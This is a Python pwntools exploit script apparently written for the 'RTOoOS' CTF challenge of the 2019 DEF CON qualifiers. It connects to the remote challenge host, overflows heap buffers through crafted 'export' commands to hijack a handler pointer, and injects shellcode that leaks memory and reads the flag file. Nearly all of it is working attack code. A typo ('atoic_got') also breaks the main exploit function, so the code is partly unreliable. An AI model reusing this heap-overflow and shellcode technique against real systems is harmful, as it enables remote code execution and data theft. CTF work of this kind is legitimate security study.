from pwn import *
from binascii import hexlify
# g_local=0
context(log_level='debug', arch='amd64')

ARR = "[RTOoOS> "

def export(sh,key,val):
	sh.send("export %s=%s" % (key, val))
	sh.recvuntil(ARR)

def cat(file):
	sh.send("cat %s" % (file))
	ret = sh.recvuntil(ARR)
	return ret[:-len(ARR)]

def allocate_len(chunklen):
	# 512 - strlen - 6 + 24 == chunklen
	ret = -(chunklen - 24 + 6 - 512)
	assert ret > 1
	return ret

l = allocate_len(0x200)
val_len = lambda x : 512 - x - 7

def allocate_pre(sh):
	sh.recvuntil(ARR)
	for i in xrange(6):
		export(sh, str(i) * l, str(i))

def leak_honcho(sh):
	honcho = 0x1508
	export(sh, str(7) * l, 'A' * (l+1+3) + p16(honcho))
	export(sh, '8' * l, (val_len(l) - (l+1) - 2) * '8' + '$' + '7' * l)
	#export(sh, str(8) * l, '8' * l + '$' + '7' * l)

	#export(sh, 'A' * allocate_len(0x20), 'B')

	export(sh, '0' * l, "leak")
	data = cat("honcho")

	f = open("honcho", "wb")
	f.write(data)
	f.close()


def no_zero(shellcode):
	for c in shellcode:
		assert c != '\x00'
def rce(sh,shellcode):
	export_handler = 0xC43
	export(sh, str(7) * l, 'A' * (l+1+3) + p16(export_handler))
	export(sh, '8' * l, (val_len(l) - (l+1) - 2) * '8' + '$' + '7' * l)
	no_zero(shellcode)
	export(sh, '0' * l, shellcode)
	sh.send("export ")



# mov edi,0xfffffefe;
# xor edi,0xffffffff;

def print_hex(data):
	h = hexlify(data)
	for i in xrange(0, len(h), 2):
		print data[i:i+2] + " ",

def leak_prog(off):
	sh = remote("rtooos.quals2019.oooverflow.io", 5000)
	img_addr = (-(0x7966a)+off) & 0xffffffffffffffff

	allocate_pre(sh)

	puts = 0x76
	read = 0x69
	#asm("this: jmp this")
	shellcode = '''
	mov rdi,%s;
	push 0x41;
	pop rsi;
	sub rdi,rsi;
	xor rax,rax;
	mov al,0x76;
	call rax;
	this:
	jmp this;
	''' % (hex(img_addr + 0x41))
	payload = asm(shellcode)
	rce(sh, payload)
	try:
		ret = sh.recvuntil("\n")
		if len(ret) > 1:
			print_hex(ret)
			sh.interactive()
		if ret[:3] == "\x48\x89\xC3":
			ret = True
		else:
			ret = False
		sh.close()
	except Exception as e:
		ret = False
		sh.close()
		return ret

def exp(off = (-0x13 * 0x1000)):
	sh = remote("rtooos.quals2019.oooverflow.io", 5000)
	img_addr = (-(0x7966a)+off) & 0xffffffffffffffff
	base_addr = img_addr - 0x100001996
	atoi_got = base_addr + 0x100002040
	strcasestr_got = base_addr + 0x100002170

	allocate_pre(sh)

	puts = 0x76
	read = 0x69
	cat = 0x87
	#asm("this: jmp this")
	shellcode = '''
	mov rdi,%s;
	xor rax,rax;
	mov al,0x76;
	call rax;
	xor rax,rax;
	mov al,0x69;
	mov rdi,%s;
	push 0x41;
	pop rsi;
	call rax;
	mov rdi,%s;
	xor rax,rax;
	mov al,0x76;
	call rax;
	mov rax,0xffffffff989e9399;
	xor rax,0xffffffffffffffff;
	push rax;
	mov rdi,rsp;
	xor rax,rax;
	mov al,0x87;
	call rax;
	this:
	jmp this;
	''' % (hex(atoic_got), hex(strcasestr_got), hex(strcasestr_got))
	payload = asm(shellcode)
	rce(sh, payload)
	malloc_addr = u64(sh.recvuntil("\x7f\n")[:-1] + '\x00\x00')
	print hex(malloc_addr)
	sh.send(p64(malloc_addr))

	sh.interactive()

# for i in xrange(0x20):
# 	print "testing " + hex(i)
# 	if leak_prog(-0x13 * 0x1000):
# 		print hex(i * 0x1000)
# 		input()

exp()

